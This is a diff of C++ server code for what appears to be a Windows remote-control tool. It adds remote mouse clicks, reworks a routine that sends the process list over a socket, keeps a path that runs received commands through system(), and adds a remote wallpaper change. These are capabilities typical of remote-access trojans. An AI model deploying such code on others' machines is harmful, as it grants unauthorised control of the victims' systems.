@@ -28,7 +28,7 @@ char mes[500]={0};
 char Csimb[3]={0};
 char Cbott[3]={0};
 char ctsk[7]={0};
-char ver[50]="1.1.2";
+char ver[50]="1.1.3";
 int simb=0;
 int bott=0;
 int LagCount=0;
@@ -533,40 +533,11 @@ void ricevi(SOCKET s)
 			{
 				int n=0;
 				char PID[50]={0};
+				char tpcFINE[MAX_PATH]=TEXT("FINE");
 				cout<<"<Server> TPC."<<endl;
 				DWORD aProcesses[1024], cbNeeded, cProcesses;
 				EnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded);
 				cProcesses=cbNeeded/sizeof(DWORD);
-				for(int i=0;i<cProcesses;i++)
-			    {
-			        if(aProcesses[i]!=0)
-			        {
-			            char szProcessName[MAX_PATH]=TEXT("<unknown>");
-			            HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,FALSE,aProcesses[i]);
-			            if(NULL!=hProcess)
-					    {
-					    	GetModuleFileNameEx(hProcess, 0, szProcessName, MAX_PATH);
-					        if(szProcessName[0]!='<' && szProcessName[0]!='?')
-						    {
-						    	for(int cnt=MAX_PATH;cnt>0;cnt--)
-						    	{
-						    		if(szProcessName[cnt]=='\\')
-						    		{
-						    			for(int ii=1;ii<100;ii++)
-						    			{
-						    				szProcessName[ii-1]=szProcessName[cnt+ii];
-										}
-										cnt=0;
-									}
-								}
-						    	n++;
-							}
-					        CloseHandle(hProcess);
-					    }
-			        }
-			    }
-			    char c=(char)n;
-			    send(s,&c,sizeof(c),0);
 			    for(int i=0;i<cProcesses;i++)
 			    {
 			        if(aProcesses[i]!=0)
@@ -599,6 +570,7 @@ void ricevi(SOCKET s)
 					    }
 			        }
 			    }
+			    send(s,tpcFINE,sizeof(tpcFINE),0);
 			    recv(s,PID,sizeof(PID),0);
 			    switch(PID[0])
 			    {
@@ -637,6 +609,8 @@ void ricevi(SOCKET s)
 				char Cy[5]={0};
 				char Px[5]={0};
 				char Py[5]={0};
+				char Cmsx[5]={0};
+				char Cmdx[5]={0};
 				int Lmax_x=GetSystemMetrics(SM_CXSCREEN)+1;
 				int Lmax_y=GetSystemMetrics(SM_CYSCREEN)+1;
 				int Rmax_x;
@@ -656,10 +630,28 @@ void ricevi(SOCKET s)
 					if(Py[0]=='s' && Py[1]=='t' && Py[2]=='o' && Py[3]=='p')
 						v9=false;
 					if(v9)
+						recv(s,Cmsx,sizeof(Cmsx),0);
+					if(Cmsx[0]=='s' && Cmsx[1]=='t' && Cmsx[2]=='o' && Cmsx[3]=='p')
+						v9=false;
+					if(v9)
+						recv(s,Cmdx,sizeof(Cmdx),0);
+					if(Cmdx[0]=='s' && Cmdx[1]=='t' && Cmdx[2]=='o' && Cmdx[3]=='p')
+						v9=false;
+					if(v9)
 					{
 						pos.x=atoi(Px)+1;
 						pos.y=atoi(Py)+1;
 						SetCursorPos((int)((float)pos.x/(float)Rmax_x*Lmax_x),(int)((float)pos.y/(float)Rmax_y*Lmax_y));
+						if(Cmsx[0]==1)
+						{
+							mouse_event(MOUSEEVENTF_LEFTDOWN,0,0,0,0);
+							mouse_event(MOUSEEVENTF_LEFTUP,0,0,0,0);
+						}
+						if(Cmdx[0]==1)
+						{
+							mouse_event(MOUSEEVENTF_RIGHTDOWN,0,0,0,0);
+							mouse_event(MOUSEEVENTF_RIGHTUP,0,0,0,0);
+						}
 					}
 				}
 				cout<<"<Server> MouseTrack OFF."<<endl;
@@ -730,9 +722,13 @@ void ricevi(SOCKET s)
 				outfile<<Cscript;
 				outfile.close();
 				
-				cout<<"\n\n"<<buff<<"\n"<<cmd<<"\n\n";
-				
 				system(cmd);
+			}
+			if(msg[0]=='X' && msg[1]=='X')
+			{
+				cout<<"<Server> Background deleted."<<endl;
+				string tmp = "C:\\picture.jpg";
+   			 	SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID*)tmp.c_str(), SPIF_SENDCHANGE);
 			}
 		}
 		else
